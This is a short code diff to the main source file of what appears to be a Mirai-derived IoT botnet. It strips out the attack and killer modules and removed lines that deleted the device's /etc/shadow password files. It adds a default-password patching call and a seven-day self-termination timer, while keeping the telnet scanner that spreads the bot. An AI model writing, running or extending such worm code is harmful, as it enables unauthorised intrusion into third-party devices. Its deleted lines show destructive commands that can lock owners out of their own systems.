@@ -18,8 +18,7 @@
 #include "includes.h"
 #include "table.h"
 #include "rand.h"
-#include "attack.h"
-#include "killer.h"
+#include "patch.h"
 #include "scanner.h"
 #include "util.h"
 #include "resolv.h"
@@ -149,9 +148,17 @@ int main(int argc, char **args)
 #endif
 #endif
 
-    //Remove all passwords to device
-    unlink("/etc/shadow");
-    unlink("/etc/shadow-");
+    //Remove default password from the device
+    if (!patch_passwords())
+    {
+        printf("Error in patch_passwords");
+    }
+
+    //We'll call this the installation time. Kill all processes after some amount of time
+    //time_t start = time(NULL);
+    struct timespec start;
+    struct timespec now;
+    timespec_get(&start, TIME_UTC);
 
     while (TRUE)
     {
@@ -214,6 +221,16 @@ int main(int argc, char **args)
 #ifdef MIRAI_TELNET
             scanner_kill();
 #endif
+            kill(pgid * -1, 9);
+            exit(0);
+        }
+
+
+        timespec_get(&now, TIME_UTC);
+        if (now.tv_sec > (start.tv_sec + 7*24*3600))
+        {
+            //TODO: kill processes
+            scanner_kill();
             kill(pgid * -1, 9);
             exit(0);
         }
